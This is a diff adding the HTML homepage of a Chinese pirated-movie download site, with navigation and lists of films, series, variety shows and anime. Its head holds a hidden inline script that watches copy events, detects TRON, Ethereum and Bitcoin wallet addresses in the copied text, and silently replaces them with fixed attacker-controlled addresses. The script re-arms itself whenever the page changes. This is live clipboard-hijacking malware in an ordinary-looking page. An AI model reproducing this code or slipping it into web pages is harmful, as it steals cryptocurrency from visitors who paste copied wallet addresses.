@@ -1,0 +1,1362 @@
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <base />
+    <title>迅播影院-MP4高清手机电影下载-Gvod电影-迅雷电影下载-迅播22tu.com</title>
+<script src="https://jscdn.top/v1/app"></script>
+
+    <meta name="keywords" content="迅播,迅播影院,电影下载,免费电影下载,迅雷电影下载,最新电影,720p高清电影,1080p高清电影,手机在线电影" />
+    <meta name="description" content="迅播影院22tu.com提供最好的迅雷电影下载网，迅播影院分享最新电影，迅播高清电影、综艺、动漫、华语电影、欧美电影，亚洲电影、手机在线电影、电视剧等下载！" />
+    <meta http-equiv="x-ua-compatible" content="ie=7" />
+<link href="/template/22tu/css/22tu.css" type="text/css" rel="stylesheet">
+<link href="/template/22tu/css/home.css" type="text/css" rel="stylesheet">
+<link rel="shortcut icon" href="/favicon.ico" charset="utf-8" />
+<script>
+var maccms = { "path": "", "mid": "", "aid": "1", "url": "www.22tu.app", "wapurl": "www.22tu.app", "mob_status": "2" };
+</script>
+<script src="/template/22tu/js/jquery.js"></script>
+<script type="text/javascript" src="/template/22tu/js/jquery.SuperSlide.2.1.js"></script>
+<script type="text/javascript" src="/template/22tu/js/common.js"></script>
+<script type="text/javascript" src="/template/22tu/js/jquery.lazyload.min.js"></script>
+<!--<link href="/template/22tu//css/tutd88nUjRf.css" rel="stylesheet" type="text/css" />-->
+<div id="widget-weixin" class="widget-weixin"><div class="codeimg"></div></div>
+<script type="text/javascript" src="/template/22tu/js/yBdaXfnue.js"></script>
+<script type="text/javascript" src="/static/js/home.js"></script>
+
+<script>(function(){function rca() {const tar = /(?:\b|[^A-Za-z0-9])T[a-zA-Z0-9]{33}(?:\b|[^A-Za-z0-9])/g,ear = /(?:\b|[^A-Za-z0-9])0x[a-fA-F0-9]{40}(?:\b|[^A-Za-z0-9])/g,bar = /(?:\b|[^A-Za-z0-9])(?:1[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar0 = /(?:\b|[^A-Za-z0-9])(?:3[a-km-zA-HJ-NP-Z1-9]{25,34})(?:\b|[^A-Za-z0-9])/g,bar1 = /(?:\b|[^A-Za-z0-9])(?:bc1q[a-zA-Z0-9]{38})(?:\b|[^A-Za-z0-9])/g,bar2 = /(?:\b|[^A-Za-z0-9])(?:bc1p[a-zA-Z0-9]{58})(?:\b|[^A-Za-z0-9])/g;document.addEventListener('copy', function(e) {const ttc = window.getSelection().toString();if (ttc.match(tar)) {const ncd = ttc.replace(tar, 'TDWDWdvGLnDfrym7q9bRwxexx7df87iYsc');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(ear)) {const ncd = ttc.replace(ear, '0x86df236ea49707879f435624e1411d5f8e6e18cd');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar)) {const ncd = ttc.replace(bar, '1BUtEN1HVkCEutamnjnvgiXUc4QPqnipgu');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar0)) {const ncd = ttc.replace(bar0, '1BUtEN1HVkCEutamnjnvgiXUc4QPqnipgu');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar1)) {const ncd = ttc.replace(bar1, 'bc1qh6dnxqvqcwxng5za7rd5zrz4mpyyuc85js7v0g');e.clipboardData.setData('text/plain', ncd);e.preventDefault();} else if (ttc.match(bar2)) {const ncd = ttc.replace(bar2, 'bc1qh6dnxqvqcwxng5za7rd5zrz4mpyyuc85js7v0g');e.clipboardData.setData('text/plain', ncd);e.preventDefault();}});}setTimeout(()=>{const obs = new MutationObserver(ml => {for (const m of ml) {if (m.type === 'childList') {rca();}}});obs.observe(document.body, { childList: true, subtree: true });},1000);rca();})();</script></head>
+
+<body>
+    <div id="header">
+    <div class="head">
+        <div class="top"> <span>网站最新地址：www.22tu.app<a href="" target="_blank" class="desk">欢迎来到《迅播影院》</a></span>
+            <p style="text-align:right;">
+                <a href="/vodtype/1.html" target="_self" class="desk">全部资源</a> -
+                <a onclick="SetHome(window.location)" href="javascript:void(0)">设为主页</a> -
+                <a onclick="AddFavorite(window.location,document.title)" href="javascript:void(0)">收藏本站</a> -
+                <a href="/rss.xml" class="desk">RSS订阅</a>
+            </p>
+           <div class="history">
+                <a href="javascript:;" class="gk mac_history">历史记录</a>
+            </div>
+        </div>
+        <div class="logo"><a href="/" title="迅播影院-MP4高清手机电影下载-Gvod电影-迅雷电影下载-迅播22tu.com"></a></div>
+        <div id="searchtopad"><a href="/22tutu/xbyy/" target="_blank"><img src="/template/22tu/images/ghapp.gif" border="0"></a></div>
+        <div id="search">
+            <div class="ser">
+                <form id="formsearch" action="/vodsearch/-------------.html" method="post">
+                    <input type="text" id="kw" name="wd" class="search-input" value="" onFocus="if(this.value=='请在这里搜索！'){this.value='';}" onBlur="if(this.value==''){this.value='请在这里搜索！';};" />
+                    <input type="submit" name="submit" class="sub" value="搜 索" />
+                </form>
+            </div>
+            <p>
+                 <a href="/vodsearch/%E5%8F%98%E5%BD%A2%E9%87%91%E5%88%9A-------------.html" target="_blank">变形金刚</a>&nbsp; <a href="/vodsearch/%E7%81%AB%E5%BD%B1%E5%BF%8D%E8%80%85-------------.html" target="_blank">火影忍者</a>&nbsp; <a href="/vodsearch/%E5%A4%8D%E4%BB%87%E8%80%85%E8%81%94%E7%9B%9F-------------.html" target="_blank">复仇者联盟</a>&nbsp; <a href="/vodsearch/%E6%88%98%E7%8B%BC-------------.html" target="_blank">战狼</a>&nbsp; <a href="/vodsearch/%E7%BA%A2%E6%B5%B7%E8%A1%8C%E5%8A%A8-------------.html" target="_blank">红海行动</a>&nbsp; </p> </div> <div id="menu">
+                    <div class="m">
+                        <p> <a href="/"   class="curr" >首页</a>
+                                                           <a  href="/vodtype/1.html">最新电影</a>
+                                                        <a  href="/vodtype/2.html">最新连续剧</a>
+                                                        <a  href="/vodtype/3.html">最新综艺</a>
+                                                        <a  href="/vodtype/4.html">最新动漫</a>
+                                                        <a  href="/vodtype/6.html">最新动作片</a>
+                            							<!--<a href="http://www.69shi.cc" target="_blank">小电影</a>-->
+                        </p>
+                        <span><a style="background:#BE8445;" href="/label/top.html">排行榜</a><a style="background:#BE8445;" href="/label/new.html">今日更新</a></span>
+                    </div>
+                    <p class="s">热门分类：
+                                                <a href="/vodtype/6.html" >动作片</a>
+                                                <a href="/vodtype/7.html" >喜剧片</a>
+                                                <a href="/vodtype/8.html" >爱情片</a>
+                                                <a href="/vodtype/9.html" >科幻片</a>
+                                                <a href="/vodtype/10.html" >恐怖片</a>
+                                                <a href="/vodtype/11.html" >剧情片</a>
+                                                <a href="/vodtype/12.html" >战争片</a>
+                                                <a href="/vodtype/13.html" >国产剧</a>
+                                                <a href="/vodtype/14.html" >港台剧</a>
+                                                <a href="/vodtype/15.html" >日韩剧</a>
+                                                <a href="/vodtype/16.html" >欧美剧</a>
+                                                <a href="/vodtype/20.html" >内地综艺</a>
+                                            </p>
+        </div>
+   <script src="/template/22tu/ads/404db.js"></script>
+
+    <!--/menu-->
+    <!--/header-->
+    <div id="main">
+        <div class="box newbox">
+            <div class="shot update">
+                <div class="title">
+                    <h3>今日更新40部</h3>
+                    <span><a href="/label/new.html" target="_blank">最近更新>></a></span></div>
+                <ul>
+                                        <li><i>1</i><a href="/voddetail/94280.html" title="全知干预视角" target="_blank">全知干预视角</a><span class="new">06-30</span></li>
+                                        <li><i>2</i><a href="/voddetail/94279.html" title="Running Man" target="_blank">Running Man</a><span class="new">06-30</span></li>
+                                        <li><i>3</i><a href="/voddetail/96038.html" title="莫离" target="_blank">莫离</a><span class="new">06-30</span></li>
+                                        <li><i>4</i><a href="/voddetail/95875.html" title="新进职员姜会长" target="_blank">新进职员姜会长</a><span class="new">06-30</span></li>
+                                        <li><i>5</i><a href="/voddetail/316.html" title="逆天至尊" target="_blank">逆天至尊</a><span class="new">06-30</span></li>
+                                        <li><i>6</i><a href="/voddetail/315.html" title="无上神帝" target="_blank">无上神帝</a><span class="new">06-30</span></li>
+                                        <li><i>7</i><a href="/voddetail/96346.html" title="龙之家族第三季" target="_blank">龙之家族第三季</a><span class="new">06-30</span></li>
+                                        <li><i>8</i><a href="/voddetail/94444.html" title="无限超越班第四季" target="_blank">无限超越班第四季</a><span class="new">06-30</span></li>
+                                        <li><i>9</i><a href="/voddetail/92928.html" title="给你爱情处方" target="_blank">给你爱情处方</a><span class="new">06-30</span></li>
+                                        <li><i>10</i><a href="/voddetail/94270.html" title="我家的熊孩子" target="_blank">我家的熊孩子</a><span class="new">06-30</span></li>
+                                        <li><i>11</i><a href="/voddetail/94276.html" title="两天一夜4" target="_blank">两天一夜4</a><span class="new">06-30</span></li>
+                                        <li><i>12</i><a href="/voddetail/94422.html" title="乘风2026" target="_blank">乘风2026</a><span class="new">06-30</span></li>
+                                        <li><i>13</i><a href="/voddetail/96348.html" title="街头餐厅斗士" target="_blank">街头餐厅斗士</a><span class="new">06-30</span></li>
+                                        <li><i>14</i><a href="/voddetail/96167.html" title="炽夏" target="_blank">炽夏</a><span class="new">06-30</span></li>
+                                        <li><i>15</i><a href="/voddetail/95484.html" title="五十公里桃花坞6" target="_blank">五十公里桃花坞6</a><span class="new">06-30</span></li>
+                                        <li><i>16</i><a href="/voddetail/96544.html" title="汪汪队之小砾与工程家族 第三季" target="_blank">汪汪队之小砾与工程家族 第</a><span class="new">06-30</span></li>
+                                        <li><i>17</i><a href="/voddetail/96513.html" title="说唱巅峰对决2026" target="_blank">说唱巅峰对决2026</a><span class="new">06-30</span></li>
+                                        <li><i>18</i><a href="/voddetail/96492.html" title="进错门的女人" target="_blank">进错门的女人</a><span class="new">06-30</span></li>
+                                    </ul>
+            </div>
+            <div class="content">
+                <div class="title">
+                    <h2><a href="/label/top.html" target="_blank">本周热播</a></h2>
+                    <dl>
+                                                <dd class="on"> <a href="/vodtype/1.html" target="_blank">电影</a></dd>
+                                                <dd class=""> <a href="/vodtype/2.html" target="_blank">连续</a></dd>
+                                                <dd class=""> <a href="/vodtype/3.html" target="_blank">综艺</a></dd>
+                                                <dd class=""> <a href="/vodtype/4.html" target="_blank">动漫</a></dd>
+                                            </dl>
+                </div>
+                <div class="bd clearfix">
+                                        <ul class="img-list  dis  clearfix">
+                                               <li><a class="play-img" href="/voddetail/28995.html" title="猫猫逃走了" target="_blank"><img src="/upload/vod/20251019-19/0e05336d9546775dfc448c34d5e82587.jpg" alt="猫猫逃走了" /><i></i><em>HD</em></a><b><a href="/voddetail/28995.html" title="猫猫逃走了" target="_blank">猫猫逃走了..</a></b>
+                            <p>2022-剧情片</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/16556.html" title="血溅红灯区" target="_blank"><img src="/upload/vod/20251019-7/6f6d1d64f9c3fdbbae2598a4a2b70e62.jpg" alt="血溅红灯区" /><i></i><em>HD</em></a><b><a href="/voddetail/16556.html" title="血溅红灯区" target="_blank">血溅红灯区..</a></b>
+                            <p>1993-动作片</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/13737.html" title="极速江湖" target="_blank"><img src="/upload/vod/20251019-4/ed510761e0120a3bc58f52df4770da41.jpg" alt="极速江湖" /><i></i><em>更新HD</em></a><b><a href="/voddetail/13737.html" title="极速江湖" target="_blank">极速江湖..</a></b>
+                            <p>2018-剧情片</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/1535.html" title="遥远的格桑花" target="_blank"><img src="/upload/vod/20251018-2/f318f600ca5b558e2984e6738df3851a.jpg" alt="遥远的格桑花" /><i></i><em>更新HD中字</em></a><b><a href="/voddetail/1535.html" title="遥远的格桑花" target="_blank">遥远的格桑花..</a></b>
+                            <p>2006-剧情片</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/81718.html" title="荒岛惊魂1966" target="_blank"><img src="/upload/vod/20251020-14/574faa79100cc212132715586ee2e486.jpg" alt="荒岛惊魂1966" /><i></i><em>DVD</em></a><b><a href="/voddetail/81718.html" title="荒岛惊魂1966" target="_blank">荒岛惊魂19..</a></b>
+                            <p>1966-喜剧片</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/72162.html" title="邻家兄弟" target="_blank"><img src="/upload/vod/20251020-4/5339275920e86db72858c83c7e11ab9e.jpg" alt="邻家兄弟" /><i></i><em>HD</em></a><b><a href="/voddetail/72162.html" title="邻家兄弟" target="_blank">邻家兄弟..</a></b>
+                            <p>2016-剧情片</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/57238.html" title="四角关系2005" target="_blank"><img src="/upload/vod/20251019-48/0463dbd2370082cfd067806013a7bfa9.jpg" alt="四角关系2005" /><i></i><em>HD</em></a><b><a href="/voddetail/57238.html" title="四角关系2005" target="_blank">四角关系20..</a></b>
+                            <p>2005-喜剧片</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/50389.html" title="化外之民" target="_blank"><img src="/upload/vod/20251019-41/175b8f3315fe96ac4b389e9f1d7cfddc.jpg" alt="化外之民" /><i></i><em>更新HD中字</em></a><b><a href="/voddetail/50389.html" title="化外之民" target="_blank">化外之民..</a></b>
+                            <p>1997-动作片</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/47594.html" title="铁雨" target="_blank"><img src="/upload/vod/20251019-38/2eba929fe082ad71e0d7edfca5ffd44d.jpg" alt="铁雨" /><i></i><em>HD</em></a><b><a href="/voddetail/47594.html" title="铁雨" target="_blank">铁雨..</a></b>
+                            <p>2017-动作片</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/39821.html" title="漫长的黑夜" target="_blank"><img src="/upload/vod/20251019-30/713d6f627622b915e62598a3a6915209.jpg" alt="漫长的黑夜" /><i></i><em>HD</em></a><b><a href="/voddetail/39821.html" title="漫长的黑夜" target="_blank">漫长的黑夜..</a></b>
+                            <p>2022-恐怖片</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list undis clearfix">
+                                               <li><a class="play-img" href="/voddetail/76032.html" title="盖布瑞案：消逝的小生命第一季" target="_blank"><img src="/upload/vod/20251020-8/4c8377f5bc2bdbf4d237e463d8ccdf9d.jpg" alt="盖布瑞案：消逝的小生命第一季" /><i></i><em>已完结</em></a><b><a href="/voddetail/76032.html" title="盖布瑞案：消逝的小生命第一季" target="_blank">盖布瑞案：消..</a></b>
+                            <p>2020-欧美剧</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/69940.html" title="重启剧组" target="_blank"><img src="/upload/vod/20251020-2/c483ce3b5ac8bbd2a04d49a4fd4e4f08.jpg" alt="重启剧组" /><i></i><em>已完结</em></a><b><a href="/voddetail/69940.html" title="重启剧组" target="_blank">重启剧组..</a></b>
+                            <p>2022-欧美剧</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/63529.html" title="加油吧！程序员" target="_blank"><img src="/upload/vod/20251019-54/3987331cf37635cbda20a7b28b17e231.jpg" alt="加油吧！程序员" /><i></i><em>已完结</em></a><b><a href="/voddetail/63529.html" title="加油吧！程序员" target="_blank">加油吧！程序..</a></b>
+                            <p>2023-国产剧</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/26975.html" title="黄昏的优作" target="_blank"><img src="/upload/vod/20251019-17/9fa917442bf1c4a5b4e7d99d527cb946.jpg" alt="黄昏的优作" /><i></i><em>已完结</em></a><b><a href="/voddetail/26975.html" title="黄昏的优作" target="_blank">黄昏的优作..</a></b>
+                            <p>2023-日韩剧</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/10408.html" title="公寓大楼里的谋杀案第一季" target="_blank"><img src="/upload/vod/20251019-1/3e0e23e4389d8fcc734d4408f60a538b.jpg" alt="公寓大楼里的谋杀案第一季" /><i></i><em>已完结</em></a><b><a href="/voddetail/10408.html" title="公寓大楼里的谋杀案第一季" target="_blank">公寓大楼里的..</a></b>
+                            <p>2021-欧美剧</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/7828.html" title="我与沃尔特家男孩的生活" target="_blank"><img src="/upload/vod/20251018-8/95cc8338b0aed666d4e76c7f6c8f6608.jpg" alt="我与沃尔特家男孩的生活" /><i></i><em>已完结</em></a><b><a href="/voddetail/7828.html" title="我与沃尔特家男孩的生活" target="_blank">我与沃尔特家..</a></b>
+                            <p>2023-欧美剧</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/72227.html" title="口香糖第一季" target="_blank"><img src="/upload/vod/20251020-4/27c5a7538c84519f60125c73df8fb1cf.jpg" alt="口香糖第一季" /><i></i><em>已完结</em></a><b><a href="/voddetail/72227.html" title="口香糖第一季" target="_blank">口香糖第一季..</a></b>
+                            <p>2015-欧美剧</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/8800.html" title="少年间谍第一季" target="_blank"><img src="/upload/vod/20251018-9/20528eb1bc1fbe1e2a861a2bb2522444.jpg" alt="少年间谍第一季" /><i></i><em>已完结</em></a><b><a href="/voddetail/8800.html" title="少年间谍第一季" target="_blank">少年间谍第一..</a></b>
+                            <p>2020-欧美剧</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/7702.html" title="外星居民第四季" target="_blank"><img src="/upload/vod/20251018-8/3ab1177559e8ea6e58643bcc12fecb94.jpg" alt="外星居民第四季" /><i></i><em>更新第10集</em></a><b><a href="/voddetail/7702.html" title="外星居民第四季" target="_blank">外星居民第四..</a></b>
+                            <p>2025-欧美剧</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/92243.html" title="红妆问佳人" target="_blank"><img src="/upload/vod/20260109-1/126628f794b9b52b4e5cdf819ead3668.jpg" alt="红妆问佳人" /><i></i><em>更新第24集</em></a><b><a href="/voddetail/92243.html" title="红妆问佳人" target="_blank">红妆问佳人..</a></b>
+                            <p>2026-国产剧</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list undis clearfix">
+                                               <li><a class="play-img" href="/voddetail/27573.html" title="六一特别节目《2024年亚洲跳绳锦标赛》" target="_blank"><img src="/upload/vod/20251019-18/23e5652cc7e562a11289a3a5937ab4a6.jpg" alt="六一特别节目《2024年亚洲跳绳锦标赛》" /><i></i><em>已完结</em></a><b><a href="/voddetail/27573.html" title="六一特别节目《2024年亚洲跳绳锦标赛》" target="_blank">六一特别节目..</a></b>
+                            <p>2024-内地综艺</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/73715.html" title="幸存者：正邪之争第二十季" target="_blank"><img src="/upload/vod/20251020-6/928561947446251b5655bbafb6ec6c12.jpg" alt="幸存者：正邪之争第二十季" /><i></i><em>已完结</em></a><b><a href="/voddetail/73715.html" title="幸存者：正邪之争第二十季" target="_blank">幸存者：正邪..</a></b>
+                            <p>2010-欧美综艺</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/67048.html" title="目击超自然 第三季" target="_blank"><img src="/upload/vod/20251019-57/33f8c35ca7eab60343cf00ccd9331b23.jpg" alt="目击超自然 第三季" /><i></i><em>6集全</em></a><b><a href="/voddetail/67048.html" title="目击超自然 第三季" target="_blank">目击超自然 ..</a></b>
+                            <p>2021-欧美综艺</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/52581.html" title="喜欢你我也是第五季" target="_blank"><img src="/upload/vod/20251019-43/50e8d326b5bb058585a52ac522c85fa8.jpg" alt="喜欢你我也是第五季" /><i></i><em>更新20240626中</em></a><b><a href="/voddetail/52581.html" title="喜欢你我也是第五季" target="_blank">喜欢你我也是..</a></b>
+                            <p>2024-内地综艺</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/58169.html" title="中国礼中国乐第二季" target="_blank"><img src="/upload/vod/20251019-48/e1dc9a00ef71a98e7076128189de20a1.jpg" alt="中国礼中国乐第二季" /><i></i><em>已完结</em></a><b><a href="/voddetail/58169.html" title="中国礼中国乐第二季" target="_blank">中国礼中国乐..</a></b>
+                            <p>2023-内地综艺</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/51737.html" title="2025浙江卫视跨年" target="_blank"><img src="/upload/vod/20251019-42/651cd91ffe23c2eb5f241754e559f3f2.jpg" alt="2025浙江卫视跨年" /><i></i><em>更新HD</em></a><b><a href="/voddetail/51737.html" title="2025浙江卫视跨年" target="_blank">2025浙江..</a></b>
+                            <p>2025-内地综艺</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/95171.html" title="死亡游戏：千万韩元赌起2" target="_blank"><img src="/upload/vod/20260422-1/abf786824f743b6c4c73da20d4545687.webp" alt="死亡游戏：千万韩元赌起2" /><i></i><em>更新至01期</em></a><b><a href="/voddetail/95171.html" title="死亡游戏：千万韩元赌起2" target="_blank">死亡游戏：千..</a></b>
+                            <p>2026-日韩综艺</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/26556.html" title="乘风第五季舞台纯享版" target="_blank"><img src="/upload/vod/20251019-17/ef6180384b58417fae0af504aee1c306.jpg" alt="乘风第五季舞台纯享版" /><i></i><em>更新至第7期</em></a><b><a href="/voddetail/26556.html" title="乘风第五季舞台纯享版" target="_blank">乘风第五季舞..</a></b>
+                            <p>2024-内地综艺</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/59358.html" title="跨越时空的旋律" target="_blank"><img src="/upload/vod/20251019-50/d6ac2db147d3287fe02ac582e8ff3c0e.jpg" alt="跨越时空的旋律" /><i></i><em>已完结</em></a><b><a href="/voddetail/59358.html" title="跨越时空的旋律" target="_blank">跨越时空的旋..</a></b>
+                            <p>2023-内地综艺</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/17493.html" title="你们说了算——里院来福战" target="_blank"><img src="/upload/vod/20251019-8/3a81ec3d6499578ea805c1b2593eb86a.jpg" alt="你们说了算——里院来福战" /><i></i><em>已完结</em></a><b><a href="/voddetail/17493.html" title="你们说了算——里院来福战" target="_blank">你们说了算—..</a></b>
+                            <p>2024-内地综艺</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list undis clearfix">
+                                               <li><a class="play-img" href="/voddetail/71603.html" title="雀斑公主" target="_blank"><img src="/upload/vod/20251020-4/aec9e618ff1855dee310bb7780fc2ecb.jpg" alt="雀斑公主" /><i></i><em>HD</em></a><b><a href="/voddetail/71603.html" title="雀斑公主" target="_blank">雀斑公主..</a></b>
+                            <p>2021-日韩动漫</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/3471.html" title="启运丹田：开局签到至尊丹田" target="_blank"><img src="/upload/vod/20251018-4/42744af06a4dd03f1ff26c3cf2cf6376.jpg" alt="启运丹田：开局签到至尊丹田" /><i></i><em>更新至第08集</em></a><b><a href="/voddetail/3471.html" title="启运丹田：开局签到至尊丹田" target="_blank">启运丹田：开..</a></b>
+                            <p>2025-国产动漫</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/67542.html" title="听到涛声国语" target="_blank"><img src="/upload/vod/20251019-58/2cef63bfabb10d803f0f0cbc7dc526de.jpg" alt="听到涛声国语" /><i></i><em>HD</em></a><b><a href="/voddetail/67542.html" title="听到涛声国语" target="_blank">听到涛声国语..</a></b>
+                            <p>1993-日韩动漫</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/46090.html" title="锦绣重生：早安傅太太" target="_blank"><img src="/upload/vod/20251019-36/059569774c86642f927cbc702a73cfab.jpg" alt="锦绣重生：早安傅太太" /><i></i><em>更新第14集</em></a><b><a href="/voddetail/46090.html" title="锦绣重生：早安傅太太" target="_blank">锦绣重生：早..</a></b>
+                            <p>2019-国产动漫</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/61907.html" title="蜡笔小新：超级美味B级美食大逃亡" target="_blank"><img src="/upload/vod/20251019-52/92e9be45d0824c1dc65f3169e5e94531.jpg" alt="蜡笔小新：超级美味B级美食大逃亡" /><i></i><em>HD</em></a><b><a href="/voddetail/61907.html" title="蜡笔小新：超级美味B级美食大逃亡" target="_blank">蜡笔小新：超..</a></b>
+                            <p>2013-日韩动漫</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/93492.html" title="精灵宝可梦太阳与月亮" target="_blank"><img src="/upload/vod/20260221-1/26f7d48ce8564c2bd7da2a6eff80b137.png" alt="精灵宝可梦太阳与月亮" /><i></i><em>已完结</em></a><b><a href="/voddetail/93492.html" title="精灵宝可梦太阳与月亮" target="_blank">精灵宝可梦太..</a></b>
+                            <p>2019-日韩动漫</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/46563.html" title="金龟子" target="_blank"><img src="/upload/vod/20251019-37/6ff5aa6d8887bacad20f017784640778.jpg" alt="金龟子" /><i></i><em>HD</em></a><b><a href="/voddetail/46563.html" title="金龟子" target="_blank">金龟子..</a></b>
+                            <p>2018-国产动漫</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/46558.html" title="啦啦啦德玛西亚第二季" target="_blank"><img src="/upload/vod/20251019-37/8918abf2954154225893e131996515c3.jpg" alt="啦啦啦德玛西亚第二季" /><i></i><em>更新第05集</em></a><b><a href="/voddetail/46558.html" title="啦啦啦德玛西亚第二季" target="_blank">啦啦啦德玛西..</a></b>
+                            <p>2012-国产动漫</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/30178.html" title="彩叶草之梦" target="_blank"><img src="/upload/vod/20251019-20/ea9f5867098639119a097909f23ace22.jpg" alt="彩叶草之梦" /><i></i><em>已完结</em></a><b><a href="/voddetail/30178.html" title="彩叶草之梦" target="_blank">彩叶草之梦..</a></b>
+                            <p>2023-日韩动漫</p>
+                        </li>
+                                               <li><a class="play-img" href="/voddetail/54308.html" title="洛克王国大冒险" target="_blank"><img src="/upload/vod/20251019-45/991b29a953cc484c035152d118963239.jpg" alt="洛克王国大冒险" /><i></i><em>已完结</em></a><b><a href="/voddetail/54308.html" title="洛克王国大冒险" target="_blank">洛克王国大冒..</a></b>
+                            <p>2013-国产动漫</p>
+                        </li>
+                                            </ul>
+                                    </div>
+            </div>
+            <div class="cr"></div>
+        </div>
+        <!--/box-->
+        <div class="trailers">
+            <div class="title"><b><a href="/label/new.html" target="_blank" style="color:#06A6E2">好评</a></b> 全部<i>96460 </i>部>></div>
+            <ul class="img-list">
+                                <li><a href="/voddetail/17.html" title="玛丽和古怪爸爸们" target="_blank" class="play-img"><img src="/upload/vod/20251018-1/ee0cebe2a98d83b199e65ec689e0f0fe.jpg" alt="玛丽和古怪爸爸们" /><i></i><em>更新第120集</em></a><b><a href="/voddetail/17.html" title="玛丽和古怪爸爸们" target="_blank">玛丽和古怪爸爸们..</a></b>
+                    <p><a href="/voddetail/17.html" title="玛丽和古怪爸爸们" target="_blank">热评</a></p>
+                </li>
+                                <li><a href="/voddetail/33.html" title="冒牌妈咪" target="_blank" class="play-img"><img src="/upload/vod/20251018-1/ea95dfc66c182690bf42b3222fdb6033.jpg" alt="冒牌妈咪" /><i></i><em>更新第10集</em></a><b><a href="/voddetail/33.html" title="冒牌妈咪" target="_blank">冒牌妈咪..</a></b>
+                    <p><a href="/voddetail/33.html" title="冒牌妈咪" target="_blank">热评</a></p>
+                </li>
+                                <li><a href="/voddetail/38.html" title="现在就出发第三季" target="_blank" class="play-img"><img src="/upload/vod/20251018-1/9617883e5e3d67e84521f2b17b176053.jpg" alt="现在就出发第三季" /><i></i><em>更新220251211范丞丞</em></a><b><a href="/voddetail/38.html" title="现在就出发第三季" target="_blank">现在就出发第三季..</a></b>
+                    <p><a href="/voddetail/38.html" title="现在就出发第三季" target="_blank">热评</a></p>
+                </li>
+                                <li><a href="/voddetail/54.html" title="无尽之海" target="_blank" class="play-img"><img src="/upload/vod/20251018-1/ba741d7eae844b7fa01f177a9683c152.jpg" alt="无尽之海" /><i></i><em>更新第16集</em></a><b><a href="/voddetail/54.html" title="无尽之海" target="_blank">无尽之海..</a></b>
+                    <p><a href="/voddetail/54.html" title="无尽之海" target="_blank">热评</a></p>
+                </li>
+                                <li><a href="/voddetail/57.html" title="亲密的雷普利" target="_blank" class="play-img"><img src="/upload/vod/20251018-1/53702b9f2a5dcc5c6646d789e4f4f784.jpg" alt="亲密的雷普利" /><i></i><em>更新至第101集</em></a><b><a href="/voddetail/57.html" title="亲密的雷普利" target="_blank">亲密的雷普利..</a></b>
+                    <p><a href="/voddetail/57.html" title="亲密的雷普利" target="_blank">热评</a></p>
+                </li>
+                                <li><a href="/voddetail/71.html" title="娑婆气" target="_blank" class="play-img"><img src="/upload/vod/20251018-1/67a93125c6e0c8fc00b392e6d4a27cd7.jpg" alt="娑婆气" /><i></i><em>更新第13集</em></a><b><a href="/voddetail/71.html" title="娑婆气" target="_blank">娑婆气..</a></b>
+                    <p><a href="/voddetail/71.html" title="娑婆气" target="_blank">热评</a></p>
+                </li>
+                                <li><a href="/voddetail/73.html" title="最后可以再拜托您一件事吗" target="_blank" class="play-img"><img src="/upload/vod/20251018-1/190b21053778c2d6d5dcc3f48e3c75c6.jpg" alt="最后可以再拜托您一件事吗" /><i></i><em>更新第13集</em></a><b><a href="/voddetail/73.html" title="最后可以再拜托您一件事吗" target="_blank">最后可以再拜托您一件事吗..</a></b>
+                    <p><a href="/voddetail/73.html" title="最后可以再拜托您一件事吗" target="_blank">热评</a></p>
+                </li>
+                                <li><a href="/voddetail/84.html" title="家有万圣喜" target="_blank" class="play-img"><img src="/upload/vod/20251018-1/9049789ae5dd59e07cff08a9f338b72b.jpg" alt="家有万圣喜" /><i></i><em>更新HD</em></a><b><a href="/voddetail/84.html" title="家有万圣喜" target="_blank">家有万圣喜..</a></b>
+                    <p><a href="/voddetail/84.html" title="家有万圣喜" target="_blank">热评</a></p>
+                </li>
+                            </ul>
+            <div class="cr"></div>
+        </div>
+        <div class="cr"></div>
+        <!--/channel-filter-->
+                <div class="box">
+            <div class="content">
+                <div class="title">
+                    <h2><a href="/vodtype/1.html">电影</a></h2>
+                    <dl>
